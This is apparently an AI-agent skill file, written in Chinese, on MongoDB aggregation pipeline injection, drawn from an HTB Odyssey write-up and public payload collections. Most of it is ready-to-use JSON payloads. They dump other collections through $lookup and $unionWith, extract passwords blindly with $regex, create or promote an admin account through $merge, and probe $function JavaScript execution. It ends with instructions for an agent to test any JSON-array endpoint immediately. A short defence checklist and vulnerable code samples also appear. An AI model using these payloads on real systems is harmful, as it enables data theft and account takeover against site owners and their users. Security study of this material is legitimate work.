---
name: 'mongodb-aggregation-injection'
description: 'MongoDB 聚合管道注入：$lookup/$facet/$unionWith/$merge 跨集合读写，含 Odyssey 实例。与 web-attacks 互补。'
disable-model-invocation: true
metadata: { domain: db, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# NoSQL 聚合管道注入 (MongoDB Aggregation Pipeline Injection)

> 来源：Odyssey HTB (Insane) Step 1 + Soroush Dalili (PortSwigger, 2024) + HackTricks + PayloadsAllTheThings
> 适用：任何 MongoDB 后端 + 用户输入被拼进 `aggregate()` 的应用

## 与传统 NoSQL 注入的区别

```
传统 NoSQLi:  ?username[$ne]=1  → 注入到 find() 的 filter
聚合管道注入: POST body 是 JSON 数组 → 注入到 aggregate() 的 pipeline
              [{ "$match": {...} }, { "$facet": {...} }]  ← 整个数组可控
```

**关键：aggregate() 接受数组参数（pipeline），不只是 filter 对象。** 能控制数组 → 能插入任意 stage。

## 检测

```
# 黑盒: 请求体是 JSON 数组 → 大概率是 aggregate()
[
  { "$match": { "name": "test" } }
]

# 测试: 加一个无害 stage → 看响应是否变化
[
  { "$match": { "name": "test" } },
  { "$limit": 1 }          # 合法 stage，如果报错 → 可能有注入点
]

# 测试: 插入聚合运算符 → 看错误
[
  { "$match": { "username": { "$ne": "" } } }   # $ne 在 filter 中
]
```

## 核心技术：$lookup 绕过集合隔离

```
"aggregate() 内 $lookup 可以访问数据库中的任意集合，没有权限隔离"
                                             — Meteor Forums, 2017

即使在 $facet 的嵌套子管道中，$lookup 仍然能 dump 任意集合。
```

### 读取其他集合（无需共享字段 — pipeline 模式）

```json
[
  {
    "$lookup": {
      "from": "users",
      "pipeline": [],
      "as": "leaked_users"
    }
  },
  { "$limit": 1 }
]
```

### 盲提取 — $regex 逐字符泄密

```json
[
  {
    "$lookup": {
      "from": "users",
      "as": "r",
      "pipeline": [
        { "$match": { "password": { "$regex": "^a" } } }
      ]
    }
  },
  { "$match": { "r": { "$ne": [] } } }
]
# 有结果 → 密码以 a 开头 → 继续枚举 ^aa, ^ab, ^ac...
```

### $unionWith — 直接合并其他集合

```json
[
  { "$match": { "_id": { "$exists": false } } },
  { "$unionWith": { "coll": "users" } }
]
```

### $merge — 写数据！插入新 admin 用户

```json
[
  { "$limit": 1 },
  {
    "$replaceWith": {
      "username": "attacker",
      "email": "att@cker.com",
      "role": "admin",
      "password": "P@ssw0rd!"
    }
  },
  {
    "$merge": {
      "into": "users",
      "whenMatched": "merge",
      "whenNotMatched": "insert"
    }
  }
]
```

### 更新已存在的用户为 admin

```json
[
  { "$unionWith": { "coll": "users" } },
  { "$match": { "username": "target_user" } },
  {
    "$set": {
      "role": "admin",
      "password": "newpass123"
    }
  },
  {
    "$merge": {
      "into": "users",
      "on": "_id",
      "whenMatched": "merge",
      "whenNotMatched": "fail"
    }
  }
]
```

### $function — JavaScript RCE（需要 server-side JS 启用）

```json
[
  {
    "$match": {
      "$expr": {
        "$function": {
          "body": "function(){ return true; }",
          "args": [],
          "lang": "js"
        }
      }
    }
  }
]
```

## Odyssey 实例：$facet + $lookup 泄露 invitation token

```json
# 原始 API: POST /api/invitations/search
# body → 直接拼入 aggregate pipeline

# 注入:
[
  { "$facet": {
      "leak": [
        { "$lookup": {
            "from": "pending_invites",
            "pipeline": [],
            "as": "r"
        }}
      ]
  }},
  { "$unwind": "$leak" }
]
# → 返回所有 pending_invites → 15 个邀请 token → 注册任意用户
```

## 服务端弱点模式

```javascript
// ❌ Node.js Express — 直接把 req.body 给 aggregate()
app.post('/search', (req, res) => {
    db.products.aggregate(req.body)  // req.body 是数组 → 攻击者控制全部 stage
        .then(data => res.json(data));
});

// ❌ Python FastAPI — 同样问题
@app.post("/search")
async def search(pipeline: list):   # 接受原始 pipeline 数组
    cursor = db.products.aggregate(pipeline)  # 直接执行
```

## 防御

```
[ ] 不用 aggregate() → 用 find() (攻击面更小)
[ ] 必须用 → 从不把用户输入直接当 pipeline
[ ] 白名单 stage: 只允许 $match, $sort, $limit, $skip
[ ] 递归过滤 $ 开头的 key（mongo-sanitize）
[ ] 禁用 server-side JS: mongod --noscripting
```

## 🔴 重点

- aggregate() 比 find() 危险得多 → $lookup 能跨集合读，$merge 能写
- 请求体是 JSON 数组 = aggregate pipeline 注入点
- 不仅读数据，可以写、可以 RCE ($function)
- 详见 mongodb-nosql-injection（传统 $ne/$regex/$where 注入）

**Why:** MongoDB aggregate pipeline 注入是与传统 NoSQLi 不同的攻击面。Odyssey Insane 的入口就是 $facet+$lookup 泄露 token。
**How to apply:** 遇到 body 是 JSON 数组的 POST 端点 → 立即测试 stage 插入。优先用 $lookup 读数据，$unionWith 合并数据，$merge 写数据。
